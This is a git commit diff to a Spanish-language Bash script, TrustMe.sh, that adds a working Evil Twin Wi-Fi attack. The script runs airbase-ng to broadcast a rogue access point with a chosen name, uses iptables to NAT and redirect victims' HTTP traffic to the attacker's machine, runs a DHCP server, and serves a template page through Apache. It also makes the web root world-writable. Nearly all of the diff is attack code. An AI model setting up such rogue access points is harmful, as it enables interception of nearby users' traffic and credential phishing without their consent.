ee0b5f35520cb558f32d2e7caf75929b95810a14
s4vitar <s4vitar@localhost.localdomain>
2018-07-03 12:37:34 +0100

    Configuración de Ataque y Gestión de Sesión desde Tmux

--- TrustMe.sh
+++ TrustMe.sh
@@ -41,7 +41,32 @@ attack()
 	iptables --flush && iptables --table nat --flush
 	iptables --delete-chain && iptables --table nat --delete-chain
 
+	sleep 1 && echo -ne "\n${yellowColour}Nombre del punto de acceso:${endColour} " && tput cnorm
+	read apName
+	sleep 1 && echo -ne "\n${yellowColour}Canal a operar: ${endColour}"
+	read channel && tput civis
 
+	sleep 1 && echo -e "\n${yellowColour}Preparando AP... ${endColour}" && sleep 1
+
+	tmux new-session -d -s EvilTwin && tmux rename-window 'Attack'
+	tmux split-window -h && tmux select-pane -t 0
+	tmux send-keys "airbase-ng -e '$apName' -c $channel -P ${interface}mon" C-m && sleep 5
+	tmux select-pane -t 1
+	tmux send-keys "ifconfig at0 192.168.1.129 netmask 255.255.255.128" C-m && sleep 0.5
+	tmux send-keys "route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129" C-m && sleep 0.5
+	tmux send-keys "iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE" C-m && sleep 0.5
+	tmux send-keys "iptables --append FORWARD --in-interface at0 -j ACCEPT" C-m && sleep 0.5
+	tmux send-keys "iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80" C-m && sleep 0.5
+	tmux send-keys "iptables -t nat -A POSTROUTING -j MASQUERADE" C-m && sleep 0.5
+
+	tmux new-window -t EvilTwin:1 -n 'dhcp'
+	tmux send-keys "dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0" C-m && sleep 0.5
+
+	sleep 1 && echo -e "\n${yellowColour}Evil Twin gestionándose a través de sesión tmux:\n ${endColour}" && tmux list-sessions
+	sleep 1 && echo -e "\n${yellowColour}Iniciando servicios... ${endColour}" && sleep 1
+
+	service apache2 start && rm -r /var/www/html/* 2>/dev/null && cp Plantilla/* /var/www/html/ 2>/dev/null && tput cnorm
+	chmod o+w -R /var/www/html
 }
 
 cleaner()
@@ -72,8 +97,9 @@ menu()
 	echo -e "$redColour-----------------------$endColour" & sleep 1
 	echo -e "${blueColour}1) ${endColour}${grayColour}Iniciar ataque${endColour}" && sleep 0.06
 	echo -e "${blueColour}2) ${endColour}${grayColour}Reiniciar configuración${endColour}" && sleep 0.06
+	echo -e "${blueColour}3) ${endColour}${grayColour}Instalación de programas necesarios${endColour}" && sleep 0.06
 	echo -e "${blueColour}0) ${endColour}${grayColour}Salir del programa${endColour}" && sleep 0.06
-	echo -e "$redColour-------------------------$endColour" & sleep 1
+	echo -e "$redColour-------------------------------------$endColour" & sleep 1
 	echo -ne "${yellowColour}Selecciona una opción:${endColour} " && tput cnorm
 	read option && tput civis
 }
@@ -98,5 +124,5 @@ if [ "$(id -u)" -eq "0" ]; then
 	esac
 
 else
-	echo -e "${redColour}Es necesario correr el programa como ${endColour}${blueColour}root${endColour}"
+	echo -e "${redColour}Es necesario correr el programa como root${endColour}"
 fi
